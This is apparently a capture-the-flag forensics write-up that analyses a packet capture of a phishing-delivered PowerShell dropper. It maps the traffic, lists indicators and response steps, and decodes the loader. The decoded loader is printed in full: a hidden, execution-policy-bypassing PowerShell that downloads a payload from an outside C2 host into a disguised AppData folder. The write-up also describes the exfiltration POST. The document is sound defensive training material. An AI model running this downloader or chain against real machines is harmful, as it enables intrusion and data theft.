---
title: "Phantom — PowerShell Dropper PCAP Analysis"
date: 2026-09-29 09:00:00 +0300
categories: [CTFs, PerfectrootDojo]
tags: [forensics, pcap, malware, powershell, incident-response]
pin: false
---

# PHANTOM - Packet Capture Walkthrough

Artifact  : capture.pcap (12,119 bytes, 45 packets, ~52 s of traffic)
Host      : WKSTN-09 (192.168.10.45), user b.omondi, domain P3RFCORP
Flag      : r00t{p0w3rsh3ll_dr0pp3r_appdAta_3xf1l}


## 1. Summary
A hidden PowerShell dropper was pulled from a look-alike CDN domain, used a
second C2 host to download a ZIP, wrote it into a Windows-looking folder under
%APPDATA%, and then phoned the ZIP back out to a third host. Because
powershell.exe ran hidden and exited when it printed "Done.", nothing was left
running by the time the analyst looked. That is why the process list looked
clean.

Full chain, in order:

  decoy traffic -> loader fetch (xor-hex) -> encoded PowerShell ->
  beacon -> staged payload (base64 ZIP, 2 chunks) -> drop to
  %APPDATA%\Microsoft\Windows\Themes\WinStore -> POST /report (exfil)


## 2. Method / Tooling
No tshark, scapy or dpkt in the sandbox, so I wrote a small pcap parser with
Python's struct module (pcap -> Ethernet -> IPv4 -> TCP/UDP), then:

  - decoded DNS by hand (incl. name compression) to map IPs to hostnames
  - reassembled each TCP flow's HTTP payloads and read them as text
  - decoded each obfuscation layer in turn (details below)

Packet numbers below refer to the capture's own order.


## 3. Traffic Triage
DNS (pkts 1-8, 14-15, 21-22, 26-27, 37-40) shows 11 lookups. Sorting them:

  Legit-looking noise (no suspicious follow-on):
    windowsupdate.com, ctldl.windowsupdate.com, www.google.com,
    login.microsoftonline.com, ocsp.digicert.com, fonts.googleapis.com
    - fonts.googleapis.com: TCP/443 handshake only (pkts 23-25), zero payload.

  Suspicious domains, each tied to an HTTP flow:
    updates.cdn-delivery.net     -> 104.21.55.200   (loader)
    api.cloudmetrics-push.com    -> 172.67.133.14   (beacon + payload C2)
    telemetry.winupdate-sync.io  -> 185.220.101.55  (exfil)

Note "winupdate-sync.io" and "cloudmetrics-push.com" are made to sound like
Windows Update / telemetry so they blend into proxy logs.


## 4. Stage-By-Stage

### 4.1 Decoy fetch (pkts 9-13)  [noise, but worth noting]
  GET http://windowsupdate.com/v9/windowsupdate/selfupdate/wuident.cab
  Response is 72 bytes starting "MZ" (a PE header stub), not a CAB (a real
  cabinet starts "MSCF"). Looks like cover traffic or a test, not the payload.

### 4.2 Loader download (pkts 16-20)  [the "came in from outside" event]
  GET http://updates.cdn-delivery.net/stage1/loader.ps1
  Referer: http://secure-docs.p3rfcorp-sharepoint.com/shared/doc.html

  The Referer is the most important clue for initial access. It is a
  look-alike of the company's SharePoint (p3rfcorp-sharepoint.com, not a
  real sharepoint.com tenant). The user was almost certainly sent a link to a
  fake "shared document" page, and that page triggered the loader fetch.

  The response header "X-Content-Encoding: xor-hex" is non-standard and
  announces the obfuscation. Body = 4,170 hex chars = 2,085 bytes.

  Decoding the XOR key (known-plaintext):
    Guessing the plaintext starts with "powershell" and XORing against the
    first bytes yields the key bytes "d8f3c1a0-4", which is the start of a
    UUID. That UUID is the X-Client-ID that the host uses in later requests:
        d8f3c1a0-4e7b-4f2a-8c9d-2b1f0e3a5d7c
    Repeating-key XOR with the full UUID decodes cleanly to:

      powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <b64>

  Observations:
    - -W Hidden is why no window appeared; -NoP/-NonI/-Exec Bypass skip
      profiles, prompts and execution policy.
    - The XOR key equals the victim's client ID, and that ID appears on the
      wire for the first time AFTER the loader (in the beacon). So it was
      already baked into whatever fetched the loader: the lure was
      per-victim, not a generic spray.
    - It is a command line saved with a .ps1 name, not a real script.

  -EncodedCommand is base64 of UTF-16LE. Decoded:

      $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine')
      $stage2url = 'http://api.cloudmetrics-push.com/v2/payload'
      $appdata = $env:APPDATA
      $stagedir = "$appdata\Microsoft\Windows\Themes\WinStore"
      If (-Not (Test-Path $stagedir)) { New-Item -ItemType Directory ... }
      $b64path = "$stagedir\~store_cache.dat"
      $zippath = "$stagedir\~store_cache.zip"
      Write-Host '[*] Fetching payload...'
      (New-Object System.Net.WebClient).DownloadFile($stage2url, $b64path)
      $b64 = [System.IO.File]::ReadAllText($b64path)
      $bytes = [System.Convert]::FromBase64String($b64)
      [System.IO.File]::WriteAllBytes($zippath, $bytes)
      Write-Host '[*] Extracting...'
      Expand-Archive -Path $zippath -DestinationPath $stagedir -Force
      Write-Host '[+] Done.'

  This answers "something was left on disk" and "the write to an unusual
  AppData subdirectory" from the EDR alert.

### 4.3 Beacon (pkts 26-32)
  POST http://api.cloudmetrics-push.com/v2/beacon
  Header X-Client-ID: d8f3c1a0-4e7b-4f2a-8c9d-2b1f0e3a5d7c
  Body is base64 JSON:
    {"cid":"d8f3c1a0-4e7b-4f2a-8c9d-2b1f0e3a5d7c","host":"WKSTN-09",
     "user":"b.omondi","os":"Windows 10 Pro 22H2",
     "ts":"2026-11-10T09:01:44Z","task":"ready"}
  C2 replies {"status":"ok","task":"fetch_payload"} - a task hand-off,
  confirming this is interactive C2, not just a download.

### 4.4 Payload delivery (pkts 33-36)
  GET /v2/payload, same X-Client-ID, in two Range requests:
    bytes 0-349   -> 206, Content-Range 0-341/684   (X-Total-Parts: 2)
    bytes 342-683 -> 206, Content-Range 342-683/684
  Concatenating the two 342-byte chunks gives 684 base64 chars, which decode
  to a 513-byte ZIP. (Chunking is a small evasion: no single large download.)
  ZIP contents:
    credentials.txt   (249 bytes)
    system_info.txt   (75 bytes)

  *** FLAG ***
  credentials.txt ends with the comment line:
      # CTF flag: r00t{p0w3rsh3ll_dr0pp3r_appdAta_3xf1l}

  The rest of credentials.txt is an "internal credentials export" for
  p3rfcorp.local: a backup service account, and a SQL "sa" connection string
  for DBSRV01/HRCore. Passwords are deliberately not reproduced here; treat
  them as burned and rotate (see section 7).
  system_info.txt: hostname, OS, user and domain for WKSTN-09.

### 4.5 Exfiltration (pkts 39-45)
  POST http://telemetry.winupdate-sync.io/report  (185.220.101.55)
  X-Correlation-ID: 8b4f2e1a-9c3d-4f5b-a0e7-1d2c3b4a5f6e
  Form body: machine=WKSTN-09, user=b.omondi, domain=P3RFCORP,
             ts=2026-11-10T09:02:33Z, data=<base64 ZIP>
  Server replies {"received":true}.

  Verification: the base64 in "data" decodes to a ZIP byte-for-byte identical
  to the one delivered in 4.4 (same 513 bytes, same sha256 below).


## 5. What The Exfil Actually Means
The "stolen" ZIP is the same file the C2 sent in. So in this capture the
outbound POST leaks no new host data beyond the metadata fields (machine,
user, domain, timestamp); the credentials and system_info content originated
at the attacker and were sent back. Two readings, and I can't tell which from
the pcap alone:
  (a) the upload is a delivery/check-in confirmation over the C2 channel; or
  (b) the staged file is a placeholder and real collection comes in a later
      stage that this capture doesn't contain.
Either way the channel works, so treat the account details as exposed if they
are real.


## 6. TIMELINE (pcap-relative)
  +0.0 s   DNS burst: windowsupdate, google, MS login (noise)
  +6.5 s   decoy fetch of wuident.cab
  +20.5 s  DNS + GET /stage1/loader.ps1  (Referer: fake SharePoint)
  +25.1 s  TLS handshake to fonts.googleapis.com, no data (noise)
  +33.4 s  DNS for api.cloudmetrics-push.com
  +35.0 s  POST /v2/beacon -> task: fetch_payload
  +37.0 s  GET /v2/payload chunk 1;  +38.5 s chunk 2
  (on host) ~store_cache.dat/.zip written, ZIP expanded, "Done."
  +49.8 s  DNS for telemetry.winupdate-sync.io
  +51.6 s  POST /report (exfil) -> {"received":true}

Whole intrusion from loader to exfil takes about 30 seconds. A hidden
PowerShell that exits itself fits the "process already gone" detail.


## 7. CAVEATS / THINGS THAT DON'T LINE UP
  - Dates disagree. The pcap header says Sun 2025-11-09 10:00 UTC, the
    payload timestamps say 2026-11-10T09:01-09:02Z (a Tuesday), and the brief
    says Monday 09:00. I could not reconcile these, so I sequenced by packet
    order and pcap-relative time. The in-payload timestamps also don't match
    the pcap gaps (49 s vs ~16.6 s between beacon and exfil), so they look
    host-reported or fabricated, not network-tap time.
  - The decoded script uses a plain WebClient.DownloadFile, which would not by
    itself send an X-Client-ID header or Range requests. The traffic shows
    both, so the implant doing the fetch did more than the script shown.
    Possibly a separate component or a modified fetch; the capture can't say.
  - The ZIP entries carry a DOS timestamp of 2026-10-09 07:36:42, i.e. built
    about a month before the "attack" date: pre-staged on the attacker side.
  - Plain HTTP throughout. On real networks, expect TLS and rely on
    DNS/SNI/JA3 and EDR instead; here the lack of encryption is what made
    full recovery possible.


## 8. Indicators Of Compromise
Domains
  updates.cdn-delivery.net
  api.cloudmetrics-push.com
  telemetry.winupdate-sync.io
  secure-docs.p3rfcorp-sharepoint.com   (phishing landing page, from Referer)

IPs
  104.21.55.200    (loader)
  172.67.133.14    (beacon / payload)
  185.220.101.55   (exfil)

URLs / patterns
  GET  /stage1/loader.ps1            (header X-Content-Encoding: xor-hex)
  POST /v2/beacon                    (base64 JSON body)
  GET  /v2/payload                   (Range chunks, X-Client-ID)
  POST /report                       (X-Correlation-ID, form field data=)

Identifiers
  X-Client-ID       d8f3c1a0-4e7b-4f2a-8c9d-2b1f0e3a5d7c
  X-Correlation-ID  8b4f2e1a-9c3d-4f5b-a0e7-1d2c3b4a5f6e

Host artifacts (WKSTN-09, b.omondi)
  %APPDATA%\Microsoft\Windows\Themes\WinStore\
      ~store_cache.dat, ~store_cache.zip, credentials.txt, system_info.txt
  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ...

Hashes
  Delivered ZIP sha256  5f937d21b9ac683f5c63fefa86c4938ea69d122e390a910946153c63e975b867
  Delivered ZIP md5     e12df3d7b8005717a5d33566525664af
  Decoded loader sha256 0133b60bad97b2852bf664177610e34ee50838cf2fda4be12993241d8309636c


## 9. Att&Ck Mapping
  T1566.002  Phishing: spearphishing link (fake SharePoint referer)
  T1059.001  PowerShell
  T1027      Obfuscated files/info (xor-hex, UTF-16LE base64)
  T1105      Ingress tool transfer (loader, chunked payload)
  T1071.001  C2 over web protocols (beacon, task hand-off)
  T1074.001  Local data staging (WinStore folder)
  T1036      Masquerading (Windows-looking path, ~store_cache names,
             update/telemetry-style domains)
  T1564.003  Hidden window
  T1041      Exfiltration over C2 channel


## 10. Response Recommendations
  1. Isolate WKSTN-09; collect %APPDATA%\Microsoft\Windows\Themes\WinStore
     and PowerShell logs (4104 script block, 4103, Sysmon 1/3/11) first.
  2. Block the three domains and three IPs; sinkhole the phishing domain and
     search proxy/mail logs for other users who hit it.
  3. Rotate the exposed backup service account and the SQL "sa" credential;
     review DBSRV01/HRCore access logs.
  4. Reset b.omondi's credentials and sessions; look for the same User-Agent
     plus X-Client-ID / X-Correlation-ID elsewhere.
  5. Detections: hidden/encoded PowerShell launches, DownloadFile from
     non-Microsoft hosts, new folders under ...\Themes\, and plain-HTTP
     requests to look-alike update/telemetry domains.
